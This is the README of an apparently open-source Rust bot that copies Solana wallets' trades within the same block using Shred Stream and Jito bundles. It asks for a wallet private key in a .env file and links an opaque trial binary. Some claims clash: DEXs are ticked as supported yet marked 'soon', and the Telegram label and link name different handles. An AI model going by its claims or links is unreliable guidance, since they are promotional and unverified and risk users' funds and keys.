# ⚡ Solana Copytrading Bot — Powered by Shred Stream & Jito Engine
An ultra-low-latency, block-speed copytrading bot for Solana, built in Rust. This open-source bot uses Shred Stream via Vibe Station and Jito Engine to mirror trades before they're finalized, making it ideal for real-time DeFi, memecoin launches, and sniping strategies.
## Overview

🚀 Copy transactions before they reach finality, land in the same block as the original, and outpace RPC/Geyser-based bots.

---

##🔑 Core Features

🔥 Shred Stream Integration (via Vibe Station)
Pre-finality detection: Reads validator shreds in real time—before blocks are formed.

Block-fast reactions: Your copy transaction often lands in the same block.

No RPC bottlenecks: Operates outside of traditional API flows.

⚙️ Jito Engine Support
Bundle transactions directly into blocks.

Integrated with Jito tip stream for optimal slot inclusion.

🦀 Rust-Powered Engine
High-throughput: Rust’s performance enables millisecond response.

Memory-safe: Zero crashes, zero garbage collection delays.

🔁 Real-Time Copytrading
Watches target wallets and copies trades across Pump.fun, Pump.fun AMM, and soon Raydium, Orca, and Meteora.

Copies buys, sells, and swaps with slippage and tipping customization.

🧩 Modular & Extensible
Add or swap DEX integrations via plug-and-play architecture.

### Multi-DEX Support

💡 Supported DEXs (Current & Upcoming)

* [x] **Pump.fun**
* [x] **Pump.fun amm**
* [x] **Raydium**(soon)
* [x] **Orca**(soon)
* [x] **Meteora**(soon)

### Pluggable Architecture

Modular structure makes it easy to expand or swap logic per DEX or data source.

---

## 🛠 Project Structure

```
src/
├── core/
│   ├── token.rs          # Token definitions and serialization
│   └── tx.rs             # Transaction construction & parsing
│
├── engine/
│   ├── swap.rs           # Handles actual token swaps
│   └── monitor.rs        # Monitors targets using RPC, Geyser & Shred Stream
│
├── dex/
│   ├── pump_fun.rs       # Pump.fun integration
│   ├── raydium.rs        # Raydium integration
│   ├── meteora.rs        # Meteora integration
│   └── orca.rs           # Orca integration
│
├── services/
│   ├── jito.rs           # Jito block engine
│   ├── nextblock.rs      # Alternate fast confirmation system
│   └── shredstream.rs    # Vibe Station integration for Shred Stream
│
├── common/
│   ├── config.rs         # Config loader
│   ├── constants.rs      # Global constants
│   ├── logger.rs         # Logging utilities
│   ├── targetlist.rs     # List manager for monitored wallets
│   └── utils.rs          # General helper functions
│
├── lib.rs
└── main.rs
```

---

## ⚙️ Configuration

Set your `.env` or environment variables accordingly:

```env
PRIVATE_KEY=your_private_key
RPC_HTTPS=https://mainnet.helius-rpc.com/?api-key=your_api_key
RPC_WSS=wss://atlas-mainnet.helius-rpc.com/?api-key=your_api_key
SLIPPAGE=10
JITO_BLOCK_ENGINE_URL=https://ny.mainnet.block-engine.jito.wtf
JITO_TIP_STREAM_URL=ws://bundles-api-rest.jito.wtf/api/v1/bundles/tip_stream
JITO_TIP_PERCENTILE=50
JITO_TIP_VALUE=0.004
TOKEN_PERCENTAGE=1
SHRED_STREAM_URL=wss://vibe.your-node-provider.com/shred-stream
```

> You must be connected to a Vibe Station provider or validator node that supports Shred Stream WebSocket output.

---

## 🚀 How to Use

1. **List Wallets to Monitor**
   Add wallet addresses (one per line) into `targetlist.txt`.

2. **Build and Run**

   ```bash
   cargo build --release
   ./target/release/raypump-copytrading-bot
   ```

3. **Watch for Output**
   Real-time logs will indicate trades copied, source wallets, DEXs, and transaction status.

---

## ✅ Real World Example (Same Block Copy)

**Buy Copy (Same Block):**

* Target: [https://solscan.io/tx/4amQhsMLqv2Lbr6UyFcoTdctsD76dKAvAHFkvCDpqa6kUqeHXN7drKXpFJrqDV389Uu4rEY575WHJYdg4inSMtFf](https://solscan.io/tx/4amQhsMLqv2Lbr6UyFcoTdctsD76dKAvAHFkvCDpqa6kUqeHXN7drKXpFJrqDV389Uu4rEY575WHJYdg4inSMtFf)
* Copied: [https://solscan.io/tx/57P2bZGJ5QTThjT4jv88CXEU4oGDTgVaS2c386qBMEs2KkizN2PV7cKKZgS8uvWwPQyTpBUXTTfnjJ4dECuJf39t](https://solscan.io/tx/57P2bZGJ5QTThjT4jv88CXEU4oGDTgVaS2c386qBMEs2KkizN2PV7cKKZgS8uvWwPQyTpBUXTTfnjJ4dECuJf39t)

**Wallet:** [https://gmgn.ai/sol/address/D3QXckXy26G6rTnqHQFUxvwpRsv18o5wBrHMVoodYWTa](https://gmgn.ai/sol/address/D3QXckXy26G6rTnqHQFUxvwpRsv18o5wBrHMVoodYWTa)
**Dex:** [https://dexscreener.com/solana/JD3VPqQ7pfHZ4h2zhALfvz5E7dantyVpsDUov1Lgpump](https://dexscreener.com/solana/JD3VPqQ7pfHZ4h2zhALfvz5E7dantyVpsDUov1Lgpump)

---

## Trial Binary

Download the latest test build:
[solana-raypump-copytrading-bot(r7m-trial).zip](https://github.com/user-attachments/files/18871125/solana-raypump-copytrading-bot.r7m-trial.zip)

---

## Donate

If you appreciate this project, feel free to contribute to support further development:
**SOL Address**: `6vT7nrqtbXDWVc8cRUtifxgfDZi19aW7qhcZg2hSepwb`

---

## Support

Questions or help needed?
Connect on Telegram: [@whisdev](https://t.me/ShadowRusii)
